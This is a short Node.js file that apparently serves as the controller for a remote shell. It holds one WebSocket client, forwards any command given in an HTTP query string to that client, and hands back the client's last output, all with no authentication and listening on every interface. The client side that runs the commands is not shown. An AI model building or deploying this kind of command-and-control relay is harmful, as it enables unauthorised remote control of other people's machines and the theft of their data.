const http = require("http");
const WebSocket = require("ws");

const PORT = process.env.PORT || 8765;

let client = null;
let name = "client";
let path = "~";
let lastOutput = "no output";

const server = http.createServer((req,res)=>{
    const url = new URL(req.url, `http://${req.headers.host}`);

    // health check
    if (url.pathname === "/") {
        res.end("alive");
        return;
    }

    // send command
    if (url.pathname === "/cmd") {
        if (!client || client.readyState !== WebSocket.OPEN) {
            res.end("no client");
            return;
        }

        const cmd = url.searchParams.get("c") || "";
        client.send(cmd);
        res.end("sent");
        return;
    }

    // read last reply
    if (url.pathname === "/out") {
        res.end(lastOutput);
        return;
    }

    res.end("unknown");
});

const wss = new WebSocket.Server({ server });

wss.on("connection", ws => {
    console.log("client connected");
    client = ws;

    ws.once("message", data => {
        [path, name] = data.toString().split("|",2);
    });

    ws.on("message", msg => {
        msg = msg.toString();

        if (msg.includes("|")) {
            [path,name] = msg.split("|",2);
            return;
        }

        lastOutput = msg;
    });

    ws.on("close", ()=> {
        console.log("client left");
        client = null;
    });
});

server.listen(PORT,"0.0.0.0",()=>console.log("running on",PORT));
